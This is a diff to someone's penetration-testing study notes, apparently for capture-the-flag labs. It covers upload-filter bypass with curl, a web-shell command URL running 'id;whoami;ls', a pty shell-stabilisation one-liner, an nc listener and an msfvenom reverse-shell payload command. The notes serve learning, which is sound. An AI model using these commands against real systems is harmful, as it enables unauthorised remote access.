@@ -600,7 +600,7 @@ nc -lvnp <port> -e "cmd.sh"
 ## Stabilisation
 
 ```
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+python2 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 >have to explicitly state python,python2,python3
 
@@ -747,7 +747,7 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 - add this to a web directory with a filename like 'webshell.php'
 - then navigate to the file you uploaded and add to the url your console cmd
   
->e.g. 'http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls'
+>e.g. `http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls`
 
 then from here we can upload an RCE
 
@@ -774,3 +774,22 @@ To save a file and exit Vim, do the following:
 - Switch to command mode by pressing the Esc key.
 - Press : (colon) to open the prompt bar in the bottom left corner of the window.
 - Type x after the colon and hit Enter. This will save the changes and exit.
+
+# Bypass Client side filter 
+
+## Send the file directly to the upload point
+
+Why use the webpage with the filter, when you can send the file directly using a tool like curl?
+
+```
+curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
+```
+
+>To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.
+
+# Bypassing Server-Side Filtering
+
+>first step, google alternate extensions e.g. https://en.wikipedia.org/wiki/PHP
+
+The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.
+
